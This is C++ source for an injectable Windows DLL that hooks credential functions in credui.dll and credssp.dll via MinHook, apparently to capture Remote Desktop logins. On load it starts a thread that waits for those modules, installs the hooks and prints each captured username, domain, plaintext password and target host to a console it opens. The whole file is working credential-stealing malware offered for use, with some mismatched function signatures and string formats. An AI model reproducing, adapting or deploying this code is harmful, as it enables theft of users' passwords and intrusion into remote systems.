#include <Windows.h>

#include <cstdio>

#include "thirdparty/minhook/MinHook.h"

void* oCredUnPackAuthenticationBufferA = nullptr;

using tCredUnPackAuthenticationBufferA = BOOL(__fastcall *)(DWORD dwFlags,
    PVOID pAuthBuffer,
    DWORD cbAuthBuffer,
    LPSTR pszUserName,
    DWORD* pcchlMaxUserName,
    LPSTR pszDomainName,
    DWORD* pcchMaxDomainName,
    LPSTR pszPassword,
    DWORD* pcchMaxPassword);

BOOL hCredUnPackAuthenticationBufferA(
    DWORD dwFlags,
    PVOID pAuthBuffer,
    DWORD cbAuthBuffer,
    LPSTR pszUserName,
    DWORD* pcchlMaxUserName,
    LPSTR pszDomainName,
    DWORD* pcchMaxDomainName,
    LPSTR pszPassword,
    DWORD* pcchMaxPassword
) {

    BOOL status = reinterpret_cast<tCredUnPackAuthenticationBufferA>(oCredUnPackAuthenticationBufferA)(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, pcchlMaxUserName, pszDomainName, pcchMaxDomainName, pszPassword, pcchMaxPassword);

    wprintf(L"[ + ] Dumped creds -> username : %s : domain : %s : password : %s \n", pszUserName, pszDomainName, pszPassword); 

    return status;
}

void* oSpInitializeSecurityContextW = nullptr;

using tSpInitializeSecurityContextW = long long(__fastcall *)(
    void *    phCredential,
    void *    phContext,
    void *    pszTargetName,
    unsigned long  fContextReq,
    unsigned long  Reserved1,
    unsigned long  TargetDataRep,
    void *         pInput,
    unsigned long  Reserved2,
    void *          phNewContext,
    void *          pOutput,
    unsigned long* pfContextAttr,
    void *     ptsExpiry
);

long long hSpInitializeSecurityContextW(void* phCredential,
    void* phContext,
    void* pszTargetName,
    unsigned long  fContextReq,
    unsigned long  Reserved1,
    unsigned long  TargetDataRep,
    void* pInput,
    unsigned long  Reserved2,
    void* phNewContext,
    void* pOutput,
    unsigned long* pfContextAttr,
    void* ptsExpiry) {


    if (pszTargetName != nullptr) {
        wprintf(L"[ + ] Leaked ip -> %s \n", pszTargetName);
    }

    return reinterpret_cast<tSpInitializeSecurityContextW>(oSpInitializeSecurityContextW)(phCredential ,phContext,
                                                                                                                    pszTargetName,
                                                                                                                    fContextReq,
                                                                                                                    Reserved1,
                                                                                                                    TargetDataRep,
                                                                                                                    pInput,
                                                                                                                    Reserved2,
                                                                                                                    phNewContext,
                                                                                                                    pOutput,
                                                                                                                    pfContextAttr,
                                                                                                                    ptsExpiry);
}

bool init() {
    if (MH_Initialize() != MH_OK) {
        printf("[ - ] %s \n", "Minhook library initialization fail");
        return false;
    }
    else {
        printf("[ + ] %s \n", "Minhook library initializated");
    }
    HMODULE credui = nullptr;

    printf("[ ! ] %s \n", "Waiting credui.dll");

    do
    {
        credui = GetModuleHandleA("credui.dll");

        Sleep(1);
    } while (credui == nullptr);

    printf("[ + ] %s 0x%p \n", "credui.dll found at -> ", credui);

    HMODULE credssp = nullptr;

    printf("[ ! ] %s \n", "Waiting credssp.dll");

    do
    {
        credssp = GetModuleHandleA("credssp.dll");

        Sleep(1);
    } while (credssp == nullptr);

    printf("[ + ] %s 0x%p \n", "credssp.dll found at -> ", credssp);

    FARPROC CredUnPackAuthenticationBufferW = GetProcAddress(credui, "CredUnPackAuthenticationBufferW");

    if (CredUnPackAuthenticationBufferW) {
        printf("[ + ] %s 0x%p \n", "CredUnPackAuthenticationBufferW at -> ", CredUnPackAuthenticationBufferW);
    }
    else {
        printf("[ - ] %s \n", "CredUnPackAuthenticationBufferW get address fail");
        return false;
    }

    FARPROC SpInitializeSecurityContextW = GetProcAddress(credssp, "SpInitializeSecurityContextW");

    if (SpInitializeSecurityContextW) {
        printf("[ + ] %s 0x%p \n", "SpInitializeSecurityContextW at -> ", SpInitializeSecurityContextW);
    }
    else {
        printf("[ - ] %s \n", "SpInitializeSecurityContextW get address fail");
        return false;
    }

    printf("[ ! ] %s \n", "Setting up hooks");

    if (MH_CreateHook(CredUnPackAuthenticationBufferW, hCredUnPackAuthenticationBufferA, &oCredUnPackAuthenticationBufferA) != MH_OK) {
        printf("[ - ] %s \n", "Create hook at hCredUnPackAuthenticationBufferA fail");
        return false;
    }
    else {
        printf("[ + ] %s \n", "Hook successfully created at hCredUnPackAuthenticationBufferA");
    }

    if (MH_CreateHook(SpInitializeSecurityContextW, hSpInitializeSecurityContextW, &oSpInitializeSecurityContextW) != MH_OK) {
        printf("[ - ] %s \n", "Create hook at SpInitializeSecurityContextW fail");
        return false;
    }
    else {
        printf("[ + ] %s \n", "Hook successfully created at SpInitializeSecurityContextW");
    }

    if (MH_EnableHook(CredUnPackAuthenticationBufferW) != MH_OK) {
        printf("[ - ] %s \n", "Enable hCredUnPackAuthenticationBufferA hook fail");
        return false;
    }
    else {
        printf("[ + ] %s \n", "hCredUnPackAuthenticationBufferA hook successfully enabled");
    }

    if (MH_EnableHook(SpInitializeSecurityContextW) != MH_OK) {
        printf("[ - ] %s \n", "Enable SpInitializeSecurityContextW hook fail");
        return false;
    }
    else {
        printf("[ + ] %s \n", "SpInitializeSecurityContextW hook successfully enabled");
    }

    return true;
}

void main() {
    AllocConsole();
    freopen_s(reinterpret_cast<FILE**>(stdout), "CONOUT$", "w", stdout);

    printf("[ + ] %s\n", "Starting initialization");

    if (init()) {
        printf("[ + ] %s \n", "Successfully intializated :) ");
    }
    else {
        printf("[ - ] %s \n", "Initialization fail :(");
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (ul_reason_for_call != DLL_PROCESS_ATTACH) {
        return TRUE;
    }
    
    CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(main), nullptr, NULL, nullptr);

    return TRUE;
}

